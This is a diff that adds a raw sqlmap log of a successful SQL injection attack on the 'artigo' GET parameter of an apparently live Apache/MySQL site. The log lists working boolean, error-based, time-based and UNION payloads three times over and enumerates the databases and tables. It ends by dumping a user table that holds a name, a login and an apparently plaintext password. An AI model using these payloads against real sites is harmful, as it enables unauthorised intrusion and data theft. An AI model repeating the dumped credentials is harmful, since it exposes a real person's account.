@@ -1,0 +1,99 @@
+sqlmap identified the following injection point(s) with a total of 91 HTTP(s) requests:
+---
+Parameter: artigo (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artigo=922 AND 4027=4027
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: artigo=922 AND (SELECT 1300 FROM(SELECT COUNT(*),CONCAT(0x71766a6b71,(SELECT (ELT(1300=1300,1))),0x71626b6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: artigo=922 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 15 columns
+    Payload: artigo=-1409 UNION ALL SELECT NULL,CONCAT(0x71766a6b71,0x785847776e584e77646f4a75477849516d7751794463417a757456784c45586b566b6f6762525477,0x71626b6a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- vFlg
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] cmisp22
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: artigo (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artigo=922 AND 4027=4027
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: artigo=922 AND (SELECT 1300 FROM(SELECT COUNT(*),CONCAT(0x71766a6b71,(SELECT (ELT(1300=1300,1))),0x71626b6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: artigo=922 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 15 columns
+    Payload: artigo=-1409 UNION ALL SELECT NULL,CONCAT(0x71766a6b71,0x785847776e584e77646f4a75477849516d7751794463417a757456784c45586b566b6f6762525477,0x71626b6a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- vFlg
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: cmisp22
+[6 tables]
++------------------------+
+| SITE_V4_ANEXOS         |
+| SITE_V4_AREAS          |
+| SITE_V4_ARTIGOS        |
+| SITE_V4_CATEGORIA      |
+| SITE_V4_GALERIA_IMAGES |
+| SITE_V4_USER           |
++------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: artigo (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artigo=922 AND 4027=4027
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: artigo=922 AND (SELECT 1300 FROM(SELECT COUNT(*),CONCAT(0x71766a6b71,(SELECT (ELT(1300=1300,1))),0x71626b6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: artigo=922 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 15 columns
+    Payload: artigo=-1409 UNION ALL SELECT NULL,CONCAT(0x71766a6b71,0x785847776e584e77646f4a75477849516d7751794463417a757456784c45586b566b6f6762525477,0x71626b6a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- vFlg
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: cmisp22
+Table: SITE_V4_USER
+[1 entry]
++---------+-----------+-------+---------+--------+--------+
+| ID_USER | NOME      | SENHA | LOGIN   | STATUS | PERFIL |
++---------+-----------+-------+---------+--------+--------+
+| 1       | Gabrielle | lica  | gabicpp | 1      | 1      |
++---------+-----------+-------+---------+--------+--------+
+
